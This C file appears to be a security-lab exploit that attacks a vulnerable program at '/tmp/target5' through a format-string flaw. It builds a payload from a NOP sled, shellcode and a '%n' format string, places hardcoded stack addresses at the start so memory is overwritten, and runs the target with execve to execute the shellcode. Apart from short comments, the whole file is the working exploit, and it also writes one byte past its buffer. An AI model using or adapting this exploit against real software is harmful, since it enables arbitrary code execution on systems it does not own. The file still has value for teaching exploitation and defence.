#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET 	"/tmp/target5"
#define SIZE 		200
#define NOP 		'\x90'

int main(void)
{
	  char *args[3];
	  char *env[1];

	  char bof [SIZE];
	  int i,n;
	
	for(i=0; i < SIZE; i++){
	  	*(bof + i) =  NOP;
	} 
	n =0;
	//String format first %u will move the stack pointer to buffer, then 012582700u  will make sure that 
	//it writes the right number of bytes.
	char * string_format="%u%u%u%u%012582700u%n%n"; 

	//ShellCode
	for(i=SIZE -strlen(shellcode)- strlen(string_format)-1; i < SIZE- strlen(string_format)-1; i++){
  		*(bof + i) = shellcode[n++];
  	}
  	
  	n = 0;
  	//String format
	for(i=i; n < strlen(string_format); i++){
  		*(bof + i) = string_format[n++];
  	}
  	//Memory address, to which the number of byte will be written
	*(bof) = '\xad';
	*(bof+1) = '\xfd';
 	*(bof+2) = '\xff';
  	*(bof+3) = '\xbf';

  	*(bof+4) = '\xa9';
	*(bof+5) = '\xfd';
 	*(bof+6) = '\xff';
  	*(bof+7) = '\xbf';
  	*(bof + SIZE-1) = '\x00';

  	*(bof + SIZE) = '\x00';

	  args[0] = TARGET; args[1] = bof; args[2] = NULL;
	  env[0] = NULL;

	  if (0 > execve(TARGET, args, env))
	    fprintf(stderr, "execve failed.\n");

	  return 0;
}
